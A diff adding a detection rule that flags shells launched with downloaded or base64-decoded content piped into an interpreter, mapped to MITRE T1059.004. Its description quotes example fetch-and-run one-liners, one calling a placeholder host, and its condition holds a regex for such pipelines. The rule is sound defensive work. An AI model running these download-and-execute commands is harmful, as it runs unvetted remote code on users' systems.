@@ -1,0 +1,32 @@
+name: Downloaded or decoded script piped into a shell
+id: bced8bc9-f2a7-4ffc-a564-38a7cf2af260
+version: 1.0.0
+description: |
+  A shell was started with a command line that downloads (curl, wget, nscurl) or
+  base64-decodes content and pipes it straight into a shell or interpreter, e.g.
+  `sh -c "curl -s http://x/y.sh | bash"` or `echo <b64> | base64 -d | bash`. Droppers,
+  cron entries, osascript `do shell script` one-liners and "paste this into Terminal"
+  lures (ClickFix) all take this shape. Visible when the pipeline is passed as a single
+  `-c` argument; a pipeline typed at an interactive prompt is caught by the sequence rule
+  "Download followed by stdin-fed shell".
+  Known benign: developer tool installers (rustup, nvm, oh-my-zsh) run via a wrapper script.
+labels:
+  tactic.id: TA0002
+  tactic.name: Execution
+  technique.id: T1059.004
+  technique.name: Unix Shell
+references:
+  - https://attack.mitre.org/techniques/T1059/004/
+  - https://attack.mitre.org/techniques/T1105/
+  - atomic 3a15c372-67c1-4430-ac8e-ec06d641ce4d (indexed T1140) also exercises this behaviour (echo <b64> | base64 -d | bash)
+condition: >
+  spawn_process
+  and (ps.exe in shells or ps.name in shell_names)
+  and ps.cmdline icontains ('curl', 'wget', 'base64')
+  and ps.cmdline regex '(curl|wget|nscurl|base64 +(-d|-D|--decode))[^|]*[|][[:space:]]*(sudo +)?([^ |]*/)?((ba|z|da|k|fi)?sh|python[0-9.]*|perl|ruby|osascript)([[:space:];)]|$)'
+output: "%ps.exe (pid %ps.pid, parent %ps.parent.exe) piped remote/decoded content into a shell: %ps.cmdline"
+severity: high
+action: []
+tests:
+  atomic: [d0c88567-803d-4dca-99b4-7ce65e7b257c]
+min-engine-version: 0.1.0
